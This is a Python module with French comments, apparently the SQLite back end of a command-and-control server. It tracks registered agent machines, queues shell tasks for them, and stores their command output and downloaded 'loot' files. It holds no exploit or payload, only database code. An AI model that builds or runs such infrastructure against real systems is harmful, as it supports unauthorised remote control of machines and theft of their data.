"""Couche de données SQLite ASYNC pour agents, sessions, tâches, résultats et logs."""

# ============================================================
#  server/database.py — Base de données SQLite async
#  Rôle        : CRUD complet pour toutes les tables
#  Importé par : routes/agent.py, routes/operator.py, cleanup.py
#  Dépend de   : config.py
#  Lib         : aiosqlite (pip install aiosqlite)
#                → version async de sqlite3
#                → ne bloque JAMAIS le serveur pendant les requêtes DB
# ============================================================

import aiosqlite   # remplace sqlite3 — pip install aiosqlite
import uuid
from datetime import datetime
from typing import Optional, List, Dict, Any

from config import DB_PATH, LOG_MAX_ENTRIES

# Alias pour compatibilité avec les modules qui capturent DatabaseError
import sqlite3
DatabaseError = sqlite3.DatabaseError


# ============================================================
#  INITIALISATION DES TABLES
# ============================================================

async def init_database():
    """
    Crée toutes les tables si elles n'existent pas.
    async → appelée avec await dans le lifespan de main.py.
    aiosqlite.connect() crée le fichier .db automatiquement s'il n'existe pas.
    """
    async with aiosqlite.connect(DB_PATH) as conn:

        # ── Table operators ───────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS operators (
                id             INTEGER PRIMARY KEY AUTOINCREMENT,
                name           TEXT    UNIQUE NOT NULL,
                password_hash  TEXT    NOT NULL,
                created_at     TEXT    NOT NULL,
                last_login     TEXT,
                total_sessions INTEGER DEFAULT 0
            )
        """)

        # ── Table sessions ────────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                token         TEXT PRIMARY KEY,
                operator_name TEXT NOT NULL,
                created_at    TEXT NOT NULL,
                is_active     INTEGER DEFAULT 1,
                FOREIGN KEY (operator_name) REFERENCES operators(name)
            )
        """)

        # ── Table agents ──────────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS agents (
                id            TEXT PRIMARY KEY,
                hostname      TEXT NOT NULL,
                username      TEXT NOT NULL,
                os            TEXT NOT NULL,
                registered_at TEXT NOT NULL,
                last_seen     TEXT NOT NULL,
                status        TEXT DEFAULT 'online'
            )
        """)

        # ── Table agent_events ────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS agent_events (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id   TEXT NOT NULL,
                event_type TEXT NOT NULL,
                details    TEXT,
                timestamp  TEXT NOT NULL,
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
        """)

        # ── Table tasks ────────────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS tasks (
                task_id       TEXT PRIMARY KEY,
                session_token TEXT NOT NULL,
                agent_id      TEXT NOT NULL,
                command       TEXT NOT NULL,
                status        TEXT DEFAULT 'pending',
                created_at    TEXT NOT NULL,
                delivered_at  TEXT,
                module        TEXT DEFAULT 'shell',
                file_data     TEXT DEFAULT '',
                filename      TEXT DEFAULT '',
                technique     TEXT DEFAULT '',
                FOREIGN KEY (agent_id)      REFERENCES agents(id),
                FOREIGN KEY (session_token) REFERENCES sessions(token)
            )
        """)

        # ── Table results ────────────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS results (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                task_id     TEXT UNIQUE NOT NULL,
                agent_id    TEXT NOT NULL,
                output      TEXT NOT NULL,
                status      TEXT NOT NULL,
                received_at TEXT NOT NULL,
                FOREIGN KEY (task_id) REFERENCES tasks(task_id),
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
        """)

        # ── Table loot ────────────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS loot (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                task_id     TEXT NOT NULL,
                agent_id    TEXT NOT NULL,
                filename    TEXT NOT NULL,
                local_path   TEXT NOT NULL,
                size        INTEGER NOT NULL,
                received_at  TEXT NOT NULL,
                FOREIGN KEY (task_id) REFERENCES tasks(task_id),
                FOREIGN KEY (agent_id) REFERENCES agents(id)
            )
        """)

        # ── Table c2_logs ────────────────────────────────────────
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS c2_logs (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                level     TEXT NOT NULL,
                source    TEXT NOT NULL,
                message   TEXT NOT NULL,
                timestamp TEXT NOT NULL
            )
        """)

        await conn.commit()   # valide toutes les CREATE TABLE en une fois

    # Try to add new columns to existing tasks table (for backward compatibility)
    for col_sql in [
        "ALTER TABLE tasks ADD COLUMN module     TEXT DEFAULT 'shell'",
        "ALTER TABLE tasks ADD COLUMN file_data  TEXT DEFAULT ''",
        "ALTER TABLE tasks ADD COLUMN filename   TEXT DEFAULT ''",
        "ALTER TABLE tasks ADD COLUMN technique  TEXT DEFAULT ''",
    ]:
        try:
            async with aiosqlite.connect(DB_PATH) as conn:
                await conn.execute(col_sql)
                await conn.commit()
        except Exception:
            pass  # column already exists
    print("[DB] Tasks table schema up-to-date")

    print("[DB] Tables initialisées  (aiosqlite async)")


# ============================================================
#  OPERATORS
# ============================================================

async def create_operator(name: str, password_hash: str) -> int:
    """
    Crée un nouvel opérateur avec mot de passe hashé.
    async → écriture DB sans bloquer le serveur.
    Retourne l'ID généré.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        cursor = await conn.execute(
            "INSERT INTO operators (name, password_hash, created_at) VALUES (?, ?, ?)",
            (name, password_hash, now)
        )
        await conn.commit()
        return cursor.lastrowid   # ID auto-généré par SQLite


async def get_operator(name: str) -> Optional[Dict[str, Any]]:
    """
    Récupère un opérateur par son nom.
    async → lecture DB sans bloquer.
    Retourne dict ou None si inexistant.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row   # accès par nom de colonne
        async with conn.execute(
            "SELECT * FROM operators WHERE name = ?", (name,)
        ) as cursor:
            row = await cursor.fetchone()   # await → attend sans bloquer
    return dict(row) if row else None


async def get_operator_hash(name: str) -> Optional[str]:
    """
    Récupère le hash de mot de passe d'un opérateur.
    async → lecture DB sans bloquer.
    Retourne le hash ou None si inexistant.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT password_hash FROM operators WHERE name = ?", (name,)
        ) as cursor:
            row = await cursor.fetchone()
    return row["password_hash"] if row else None


async def update_operator_last_login(name: str):
    """
    Met à jour last_login et incrémente total_sessions.
    async → UPDATE DB sans bloquer.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE operators SET last_login = ?, total_sessions = total_sessions + 1 WHERE name = ?",
            (now, name)
        )
        await conn.commit()


async def get_all_operators() -> List[Dict[str, Any]]:
    """Retourne tous les opérateurs triés par date de création."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM operators ORDER BY created_at DESC"
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


# ============================================================
#  SESSIONS
# ============================================================

async def create_session(operator_name: str) -> str:
    """
    Crée une nouvelle session pour un opérateur.
    async → écriture DB sans bloquer.
    Retourne le token UUID généré.
    """
    token = str(uuid.uuid4())   # ex: "550e8400-e29b-41d4-a716-446655440000"
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "INSERT INTO sessions (token, operator_name, created_at) VALUES (?, ?, ?)",
            (token, operator_name, now)
        )
        await conn.commit()
    return token


async def get_session(token: str) -> Optional[Dict[str, Any]]:
    """
    Récupère une session active par son token.
    async → lecture DB sans bloquer.
    Retourne None si token invalide ou session inactive.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM sessions WHERE token = ? AND is_active = 1", (token,)
        ) as cursor:
            row = await cursor.fetchone()
    return dict(row) if row else None


async def get_all_sessions() -> List[Dict[str, Any]]:
    """Retourne toutes les sessions (actives et inactives)."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM sessions ORDER BY created_at DESC"
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def close_session(token: str):
    """
    Marque une session comme inactive (is_active = 0).
    Appelée lors du logout de l'opérateur.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE sessions SET is_active = 0 WHERE token = ?", (token,)
        )
        await conn.commit()


async def get_sessions_by_operator(name: str) -> List[Dict[str, Any]]:
    """Retourne toutes les sessions d'un opérateur donné."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM sessions WHERE operator_name = ? ORDER BY created_at DESC",
            (name,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


# ============================================================
#  AGENTS
# ============================================================

async def save_agent(agent_id: str, hostname: str, username: str, os: str):
    """
    Sauvegarde un nouvel agent dans la DB.
    INSERT OR REPLACE → si l'agent se réenregistre, met à jour sans erreur.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            """INSERT OR REPLACE INTO agents
               (id, hostname, username, os, registered_at, last_seen, status)
               VALUES (?, ?, ?, ?, ?, ?, 'online')""",
            (agent_id, hostname, username, os, now, now)
        )
        await conn.commit()


async def update_agent_last_seen_db(agent_id: str):
    """
    Met à jour last_seen dans la DB.
    Appelée à chaque poll via storage.update_agent_last_seen().
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE agents SET last_seen = ? WHERE id = ?",
            (now, agent_id)
        )
        await conn.commit()


async def set_agent_status(agent_id: str, status: str):
    """
    Change le statut d'un agent.
    status : 'online' | 'offline' | 'lost'
    Appelée par cleanup.py quand l'agent ne poll plus.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE agents SET status = ? WHERE id = ?", (status, agent_id)
        )
        await conn.commit()


async def get_agent_by_id(agent_id: str) -> Optional[Dict[str, Any]]:
    """Récupère un agent par son ID. Retourne None si inexistant."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM agents WHERE id = ?", (agent_id,)
        ) as cursor:
            row = await cursor.fetchone()
    return dict(row) if row else None


async def get_all_agents() -> List[Dict[str, Any]]:
    """Retourne tous les agents triés par date d'enregistrement."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM agents ORDER BY registered_at DESC"
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_agents_by_status(status: str) -> List[Dict[str, Any]]:
    """Retourne les agents filtrés par statut (online/offline/lost)."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM agents WHERE status = ?", (status,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def delete_agent(agent_id: str):
    """
    Supprime un agent de la DB.
    Appelée par cleanup.py quand l'agent est 'lost' depuis trop longtemps.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        await conn.commit()


async def get_agent_by_fingerprint(hostname: str, username: str, os: str) -> Optional[Dict[str, Any]]:
    """
    Recherche un agent existant par empreinte machine (hostname + username + os).
    Utilisé lors du réenregistrement : si la machine est déjà connue, on réutilise
    le même agent_id au lieu d'en créer un nouveau.
    Retourne le dernier agent enregistré avec ces caractéristiques, ou None.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            """SELECT * FROM agents
               WHERE hostname = ? AND username = ? AND os = ?
               ORDER BY registered_at DESC
               LIMIT 1""",
            (hostname, username, os)
        ) as cursor:
            row = await cursor.fetchone()
    return dict(row) if row else None


async def update_agent_reconnect(agent_id: str):
    """
    Met à jour un agent lors d'une reconnexion : status='online', last_seen=maintenant.
    Évite la création d'un doublon — réutilise la ligne existante dans la table agents.
    Appelée par POST /agent/register quand l'agent est déjà connu (par ID ou empreinte).
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE agents SET status = 'online', last_seen = ? WHERE id = ?",
            (now, agent_id)
        )
        await conn.commit()


# ============================================================
#  TASKS
# ============================================================

async def create_task(session_token: str, agent_id: str, command: str,
                      module: str = 'shell', file_data: str = '', filename: str = '',
                      technique: str = '') -> str:
    """
    Crée une nouvelle tâche dans la DB.
    async → écriture DB sans bloquer.
    Retourne le task_id généré.
    """
    task_id = str(uuid.uuid4())[:12]  # ex: "b07e98e8abfb"
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "INSERT INTO tasks (task_id, session_token, agent_id, command, created_at, module, file_data, filename, technique) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (task_id, session_token, agent_id, command, now, module, file_data, filename, technique)
        )
        await conn.commit()
    return task_id


async def mark_task_delivered(task_id: str):
    """
    Marque une tâche comme délivrée à l'agent.
    async → UPDATE DB sans bloquer.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE tasks SET delivered_at = ?, status = 'delivered' WHERE task_id = ?",
            (now, task_id)
        )
        await conn.commit()


async def mark_task_done(task_id: str, status: str):
    """
    Marque une tâche comme terminée (done/error).
    async → UPDATE DB sans bloquer.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "UPDATE tasks SET status = ? WHERE task_id = ?",
            (status, task_id)
        )
        await conn.commit()


async def get_task_by_id(task_id: str) -> Optional[Dict[str, Any]]:
    """Récupère une tâche par son ID. Retourne None si inexistante."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM tasks WHERE task_id = ?", (task_id,)
        ) as cursor:
            row = await cursor.fetchone()
    return dict(row) if row else None


async def get_tasks_by_agent(agent_id: str) -> List[Dict[str, Any]]:
    """Retourne toutes les tâches d'un agent, triées par date décroissante."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM tasks WHERE agent_id = ? ORDER BY created_at DESC",
            (agent_id,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_tasks_by_session(session_token: str) -> List[Dict[str, Any]]:
    """Retourne toutes les tâches d'une session, triées par date décroissante."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM tasks WHERE session_token = ? ORDER BY created_at DESC",
            (session_token,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_pending_tasks_for_agent(agent_id: str) -> Optional[Dict[str, Any]]:
    """
    Récupère la PREMIÈRE tâche pending d'un agent (FIFO).
    ORDER BY created_at ASC → respecte l'ordre d'envoi des commandes.
    Retourne None si aucune tâche en attente.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            """SELECT * FROM tasks
               WHERE agent_id = ? AND status = 'pending'
               ORDER BY created_at ASC LIMIT 1""",
            (agent_id,)
        ) as cursor:
            row = await cursor.fetchone()
    return dict(row) if row else None


async def get_pending_tasks_count() -> int:
    """Compte toutes les tâches en attente (toutes sessions)."""
    async with aiosqlite.connect(DB_PATH) as conn:
        async with conn.execute(
            "SELECT COUNT(*) FROM tasks WHERE status = 'pending'"
        ) as cursor:
            row = await cursor.fetchone()
    return row[0] if row else 0


async def get_all_pending_tasks() -> List[Dict[str, Any]]:
    """Retourne toutes les tâches en attente (toutes sessions, tous agents)."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM tasks WHERE status = 'pending' ORDER BY created_at ASC"
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_tasks_stats() -> Dict[str, int]:
    """
    Statistiques complètes des tâches.
    CASE WHEN → compte chaque statut en une seule requête SQL.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        async with conn.execute("""
            SELECT
                COUNT(*) as total,
                SUM(CASE WHEN status = 'pending'   THEN 1 ELSE 0 END) as pending,
                SUM(CASE WHEN status = 'delivered' THEN 1 ELSE 0 END) as delivered,
                SUM(CASE WHEN status = 'done'      THEN 1 ELSE 0 END) as done,
                SUM(CASE WHEN status = 'error'     THEN 1 ELSE 0 END) as error
            FROM tasks
        """) as cursor:
            row = await cursor.fetchone()
    return {
        "total":     row[0] or 0,
        "pending":   row[1] or 0,
        "delivered": row[2] or 0,
        "done":      row[3] or 0,
        "error":     row[4] or 0
    }


# ============================================================
#  RESULTS
# ============================================================

async def save_result(task_id: str, agent_id: str, output: str, status: str):
    """
    Sauvegarde le résultat d'une commande.
    async → écriture DB sans bloquer.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "INSERT INTO results (task_id, agent_id, output, status, received_at) VALUES (?, ?, ?, ?, ?)",
            (task_id, agent_id, output, status, now)
        )
        await conn.commit()


async def get_result_by_task(task_id: str) -> Optional[Dict[str, Any]]:
    """Récupère le résultat d'une tâche précise par task_id."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM results WHERE task_id = ?", (task_id,)
        ) as cursor:
            row = await cursor.fetchone()
    return dict(row) if row else None


async def get_results_by_session(session_token: str) -> List[Dict[str, Any]]:
    """
    Résultats d'une session uniquement.
    JOIN tasks → pour filtrer par session_token.
    Isolation : opérateur voit SEULEMENT ses résultats.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            """SELECT r.* FROM results r
               JOIN tasks t ON r.task_id = t.task_id
               WHERE t.session_token = ?
               ORDER BY r.received_at DESC""",
            (session_token,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_results_by_agent(agent_id: str) -> List[Dict[str, Any]]:
    """Retourne tous les résultats d'un agent donné."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM results WHERE agent_id = ? ORDER BY received_at DESC",
            (agent_id,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_all_results() -> List[Dict[str, Any]]:
    """Retourne tous les résultats (toutes sessions — usage admin/stats)."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM results ORDER BY received_at DESC"
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_results_by_operator(operator_name: str) -> List[Dict[str, Any]]:
    """
    Retourne TOUS les résultats de toutes les sessions pour cet opérateur.
    JOIN: results → tasks → sessions WHERE sessions.operator_name = ?
    ORDER BY received_at DESC
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            """SELECT r.* FROM results r
               JOIN tasks t ON r.task_id = t.task_id
               JOIN sessions s ON t.session_token = s.token
               WHERE s.operator_name = ?
               ORDER BY r.received_at DESC""",
            (operator_name,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_tasks_by_operator(operator_name: str) -> List[Dict[str, Any]]:
    """
    Retourne TOUTES les tâches de toutes les sessions pour cet opérateur.
    JOIN: tasks → sessions WHERE sessions.operator_name = ?
    ORDER BY created_at DESC
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            """SELECT t.* FROM tasks t
               JOIN sessions s ON t.session_token = s.token
               WHERE s.operator_name = ?
               ORDER BY t.created_at DESC""",
            (operator_name,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


# ============================================================
#  EVENTS
# ============================================================

async def log_agent_event(agent_id: str, event_type: str, details: str = ""):
    """
    Enregistre un événement dans la table agent_events.
    async → écriture DB sans bloquer.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "INSERT INTO agent_events (agent_id, event_type, details, timestamp) VALUES (?, ?, ?, ?)",
            (agent_id, event_type, details, now)
        )
        await conn.commit()


async def get_agent_events(agent_id: str) -> List[Dict[str, Any]]:
    """Retourne tous les événements d'un agent, triés par date décroissante."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM agent_events WHERE agent_id = ? ORDER BY timestamp DESC",
            (agent_id,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_recent_events(limit: int = 50) -> List[Dict[str, Any]]:
    """Retourne les N événements les plus récents (tous agents)."""
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM agent_events ORDER BY timestamp DESC LIMIT ?", (limit,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


# ============================================================
#  LOGS
# ============================================================

async def log_message(level: str, source: str, message: str):
    """
    Enregistre un message dans la table c2_logs.
    async → écriture DB sans bloquer.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        await conn.execute(
            "INSERT INTO c2_logs (level, source, message, timestamp) VALUES (?, ?, ?, ?)",
            (level, source, message, now)
        )
        await conn.commit()
        # Purge : garde seulement les LOG_MAX_ENTRIES entrées les plus récentes
        await conn.execute(
            """DELETE FROM c2_logs WHERE id NOT IN (
               SELECT id FROM c2_logs ORDER BY timestamp DESC LIMIT ?
            )""",
            (LOG_MAX_ENTRIES,)
        )
        await conn.commit()


async def get_logs(level: Optional[str] = None, limit: int = 100) -> List[Dict[str, Any]]:
    """
    Retourne les logs du serveur.
    level = None → tous les niveaux.
    level = "ERROR" → seulement les erreurs.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        if level:
            async with conn.execute(
                "SELECT * FROM c2_logs WHERE level = ? ORDER BY timestamp DESC LIMIT ?",
                (level, limit)
            ) as cursor:
                rows = await cursor.fetchall()
        else:
            async with conn.execute(
                "SELECT * FROM c2_logs ORDER BY timestamp DESC LIMIT ?", (limit,)
            ) as cursor:
                rows = await cursor.fetchall()
    return [dict(r) for r in rows]


# ============================================================
#  LOOT
# ============================================================

async def save_loot(task_id: str, agent_id: str, filename: str, local_path: str, size: int) -> int:
    """
    Sauvegarde un fichier téléchargé dans la table loot.
    async → écriture DB sans bloquer.
    Retourne l'ID généré.
    """
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    async with aiosqlite.connect(DB_PATH) as conn:
        cursor = await conn.execute(
            "INSERT INTO loot (task_id, agent_id, filename, local_path, size, received_at) VALUES (?, ?, ?, ?, ?, ?)",
            (task_id, agent_id, filename, local_path, size, now)
        )
        await conn.commit()
        return cursor.lastrowid   # ID auto-généré par SQLite


async def get_loot_by_agent(agent_id: str) -> List[Dict[str, Any]]:
    """
    Retourne tous les fichiers téléchargés d'un agent.
    async → lecture DB sans bloquer.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM loot WHERE agent_id = ? ORDER BY received_at DESC",
            (agent_id,)
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]


async def get_all_loot() -> List[Dict[str, Any]]:
    """
    Retourne tous les fichiers téléchargés (tous agents).
    async → lecture DB sans bloquer.
    """
    async with aiosqlite.connect(DB_PATH) as conn:
        conn.row_factory = aiosqlite.Row
        async with conn.execute(
            "SELECT * FROM loot ORDER BY received_at DESC"
        ) as cursor:
            rows = await cursor.fetchall()
    return [dict(r) for r in rows]